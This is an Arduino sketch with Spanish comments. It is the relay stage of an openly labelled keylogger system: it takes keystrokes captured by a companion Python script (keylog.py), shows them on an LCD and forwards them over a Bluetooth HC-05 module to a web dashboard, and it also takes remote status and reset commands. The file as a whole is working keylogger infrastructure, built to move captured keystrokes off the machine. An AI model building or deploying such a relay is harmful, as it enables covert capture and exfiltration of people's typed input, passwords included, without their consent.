/*
 * ============================================
 * Keylogger Arduino - Compatible con Web Serial API
 * ============================================
 * 
 * Este sketch recibe datos del keylog.py por USB Serial
 * y los reenvía por Bluetooth HC-05 para ser capturados
 * por la página web dashboard usando Web Serial API.
 * 
 * Conexiones:
 * - LCD: RS=12, E=11, D4=5, D5=4, D6=3, D7=2
 * - HC-05: RX=Pin 7 (desde TX del HC-05)
 *          TX=Pin 8 (hacia RX del HC-05)
 * - USB: Recibe datos de keylog.py
 * 
 * Funcionalidad:
 * 1. Recibe teclas capturadas desde Python
 * 2. Muestra en LCD 16x2
 * 3. Reenvía por Bluetooth HC-05
 * 4. Procesa tokens especiales: <EN>, <BK>, etc.
 * 
 * Compatible al 100% con:
 * - keylog.py (entrada)
 * - page/index.html + script.js (salida vía HC-05)
 * ============================================
 */

#include <LiquidCrystal.h>
#include <SoftwareSerial.h>

// ============================================
// CONFIGURACIÓN DE HARDWARE
// ============================================

// LCD 16x2 - Pines según tu diagrama
LiquidCrystal lcd(12, 11, 5, 4, 3, 2);

// Bluetooth HC-05 por SoftwareSerial
// RX del Arduino (pin 7) ← TX del HC-05
// TX del Arduino (pin 8) → RX del HC-05
SoftwareSerial BT(7, 8);

// ============================================
// VARIABLES GLOBALES
// ============================================

// Control de posición en LCD
int col = 0;  // Columna actual (0-15)
int row = 0;  // Fila actual (0-1)

// Buffer para construcción de tokens
String tokenBuffer = "";
bool leyendoToken = false;

// Estadísticas
unsigned long caracteresRecibidos = 0;
unsigned long caracteresEnviados = 0;
unsigned long tiempoInicio = 0;

// ============================================
// SETUP - Inicialización
// ============================================

void setup() {
  // Inicializar comunicación Serial USB (desde keylog.py)
  Serial.begin(9600);
  
  // Inicializar comunicación Bluetooth HC-05
  BT.begin(9600);
  
  // Inicializar LCD 16x2
  lcd.begin(16, 2);
  lcd.clear();
  
  // Mensaje de bienvenida
  lcd.setCursor(0, 0);
  lcd.print("Keylog Arduino");
  lcd.setCursor(0, 1);
  lcd.print("Iniciando...");
  
  delay(1500);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Esperando datos");
  
  // Guardar tiempo de inicio
  tiempoInicio = millis();
  
  // Enviar mensaje de inicio por Bluetooth
  BT.println("=== Sistema Keylogger Iniciado ===");
  BT.print("Tiempo: ");
  BT.print(millis());
  BT.println(" ms");
  BT.println("Esperando datos del keylogger...");
  BT.flush();
}

// ============================================
// LOOP PRINCIPAL
// ============================================

void loop() {
  // Procesar datos desde Python (USB Serial)
  while (Serial.available() > 0) {
    char c = Serial.read();
    caracteresRecibidos++;
    
    // Procesar el caracter
    procesarCaracter(c);
  }
  
  // Comandos desde Bluetooth (opcional - para control remoto)
  if (BT.available() > 0) {
    String cmd = BT.readStringUntil('\n');
    cmd.trim();
    procesarComando(cmd);
  }
}

// ============================================
// PROCESAMIENTO DE CARACTERES
// ============================================

void procesarCaracter(char c) {
  // Detectar inicio de token especial
  if (c == '<') {
    leyendoToken = true;
    tokenBuffer = "<";
    return;
  }
  
  // Si estamos leyendo un token
  if (leyendoToken) {
    tokenBuffer += c;
    
    // Fin del token
    if (c == '>') {
      leyendoToken = false;
      procesarToken(tokenBuffer);
      tokenBuffer = "";
      return;
    }
    
    // Límite de seguridad para tokens inválidos
    if (tokenBuffer.length() > 10) {
      leyendoToken = false;
      tokenBuffer = "";
    }
    return;
  }
  
  // Caracter normal - procesar y enviar
  procesarCaracterNormal(c);
}

// ============================================
// PROCESAMIENTO DE TOKENS ESPECIALES
// ============================================

void procesarToken(String token) {
  // Enviar token por Bluetooth (la página web lo procesará)
  BT.print(token);
  BT.flush();
  caracteresEnviados += token.length();
  
  // ENTER - Nueva línea
  if (token == "<EN>") {
    row++;
    if (row > 1) {
      row = 0;
      lcd.clear();
    }
    col = 0;
    lcd.setCursor(col, row);
    return;
  }
  
  // BACKSPACE - Borrar caracter anterior
  if (token == "<BK>") {
    if (col > 0) {
      col--;
      lcd.setCursor(col, row);
      lcd.print(" ");
      lcd.setCursor(col, row);
    } else if (row > 0) {
      // Si estamos al inicio de la fila, ir al final de la anterior
      row--;
      col = 15;
      lcd.setCursor(col, row);
    }
    return;
  }
  
  // FLECHAS - Mostrar indicador en LCD
  if (token == "<LEFT>") {
    mostrarIndicador("←");
    return;
  }
  
  if (token == "<RIGHT>") {
    mostrarIndicador("→");
    return;
  }
  
  if (token == "<UP>") {
    mostrarIndicador("↑");
    return;
  }
  
  if (token == "<DOWN>") {
    mostrarIndicador("↓");
    return;
  }
  
  // Token desconocido - ignorar en LCD pero enviar por BT
  // (útil para futuros tokens especiales)
}

// ============================================
// PROCESAMIENTO DE CARACTERES NORMALES
// ============================================

void procesarCaracterNormal(char c) {
  // Ignorar saltos de línea y retornos de carro puros
  // (usamos <EN> para esto)
  if (c == '\n' || c == '\r') {
    return;
  }
  
  // Enviar por Bluetooth
  BT.write(c);
  BT.flush();
  caracteresEnviados++;
  
  // Mostrar en LCD
  mostrarEnLCD(c);
}

// ============================================
// VISUALIZACIÓN EN LCD
// ============================================

void mostrarEnLCD(char c) {
  // Verificar si es un caracter imprimible
  if (c < 32 || c > 126) {
    return;  // Ignorar caracteres no imprimibles
  }
  
  // Mostrar en la posición actual
  lcd.setCursor(col, row);
  lcd.print(c);
  
  // Avanzar columna
  col++;
  
  // Control de desbordamiento de línea
  if (col >= 16) {
    col = 0;
    row++;
    
    // Si pasamos de la segunda fila, limpiar y volver al inicio
    if (row > 1) {
      row = 0;
      lcd.clear();
    }
    
    lcd.setCursor(col, row);
  }
}

// ============================================
// MOSTRAR INDICADORES TEMPORALES
// ============================================

void mostrarIndicador(String indicador) {
  // Guardar posición actual
  int colTemp = col;
  int rowTemp = row;
  
  // Mostrar indicador en esquina superior derecha
  lcd.setCursor(15, 0);
  lcd.print(indicador);
  
  // Breve pausa para que sea visible
  delay(200);
  
  // Limpiar indicador
  lcd.setCursor(15, 0);
  lcd.print(" ");
  
  // Restaurar cursor
  lcd.setCursor(colTemp, rowTemp);
}

// ============================================
// PROCESAMIENTO DE COMANDOS REMOTOS
// ============================================

void procesarComando(String cmd) {
  cmd.toUpperCase();
  
  // <RST> - Reset del sistema
  if (cmd == "<RST>" || cmd == "/CMD <RST>") {
    lcd.clear();
    col = 0;
    row = 0;
    lcd.setCursor(0, 0);
    lcd.print("Sistema");
    lcd.setCursor(0, 1);
    lcd.print("Reiniciado");
    
    BT.println("✅ Sistema reiniciado");
    BT.flush();
    
    delay(1000);
    lcd.clear();
    return;
  }
  
  // <STATUS> - Mostrar estadísticas
  if (cmd == "<STATUS>" || cmd == "/CMD <STATUS>") {
    unsigned long uptime = (millis() - tiempoInicio) / 1000;
    
    BT.println("=== STATUS DEL SISTEMA ===");
    BT.print("Uptime: ");
    BT.print(uptime);
    BT.println(" segundos");
    BT.print("Caracteres recibidos: ");
    BT.println(caracteresRecibidos);
    BT.print("Caracteres enviados: ");
    BT.println(caracteresEnviados);
    BT.print("Posición LCD: [");
    BT.print(col);
    BT.print(",");
    BT.print(row);
    BT.println("]");
    BT.println("==========================");
    BT.flush();
    
    // Mostrar en LCD brevemente
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("RX:");
    lcd.print(caracteresRecibidos);
    lcd.setCursor(0, 1);
    lcd.print("TX:");
    lcd.print(caracteresEnviados);
    delay(2000);
    lcd.clear();
    lcd.setCursor(col, row);
    return;
  }
  
  // <TEST> - Mensaje de prueba
  if (cmd == "<TEST>" || cmd == "/CMD <TEST>") {
    BT.println("✅ TEST OK - Sistema funcionando correctamente");
    BT.println("Arduino Uno + HC-05 operativo");
    BT.flush();
    
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Test OK!");
    delay(1000);
    lcd.clear();
    lcd.setCursor(col, row);
    return;
  }
  
  // <INFO> - Información del sistema
  if (cmd == "<INFO>" || cmd == "/CMD <INFO>") {
    BT.println("=== INFORMACIÓN DEL SISTEMA ===");
    BT.println("Hardware: Arduino Uno");
    BT.println("Bluetooth: HC-05");
    BT.println("Display: LCD 16x2");
    BT.println("Baudrate: 9600");
    BT.println("Sketch: KeylogWebSerial.ino");
    BT.println("Compatible: Web Serial API");
    BT.println("===============================");
    BT.flush();
    return;
  }
  
  // <CLEAR> - Limpiar pantalla
  if (cmd == "<CLEAR>" || cmd == "/CMD <CLEAR>") {
    lcd.clear();
    col = 0;
    row = 0;
    BT.println("✅ LCD limpiado");
    BT.flush();
    return;
  }
  
  // Comando desconocido
  BT.print("❌ Comando desconocido: ");
  BT.println(cmd);
  BT.println("Comandos disponibles: <RST>, <STATUS>, <TEST>, <INFO>, <CLEAR>");
  BT.flush();
}

// ============================================
// FUNCIONES AUXILIARES
// ============================================

// Limpiar buffer de LCD (útil para debugging)
void limpiarBufferLCD() {
  lcd.clear();
  col = 0;
  row = 0;
  lcd.setCursor(0, 0);
}

// Enviar mensaje de debug por Bluetooth
void debugBT(String mensaje) {
  #ifdef DEBUG
  BT.print("[DEBUG] ");
  BT.println(mensaje);
  BT.flush();
  #endif
}
